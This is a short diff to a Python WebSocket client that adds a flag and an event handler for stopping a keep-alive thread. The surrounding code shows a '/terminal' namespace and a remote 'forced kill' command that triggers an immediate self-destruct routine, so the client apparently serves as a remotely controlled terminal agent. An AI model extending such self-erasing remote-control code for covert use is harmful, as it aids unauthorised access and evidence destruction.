@@ -1314,6 +1314,7 @@ class WebSocketClient:
         self.socket = None
         self.connected = False
         self.current_dir = os.getcwd()
+        self.keep_alive_running = False
         self._setup_logger()
         self._connection_timeout = 10  # seconds
 
@@ -1360,6 +1361,12 @@ class WebSocketClient:
             def on_force_kill(data):
                 self._log_info("[!] Received forced kill command")
                 self._immediate_self_destruct()
+
+            @self.socket.on('stop_keep_alive', namespace='/terminal')
+            def on_stop_keep_alive(data):
+                self._log_info("[!] Received stop keep-alive command")
+                # Stop the keep-alive thread
+                self.keep_alive_running = False
 
     def connect(self):
         try:
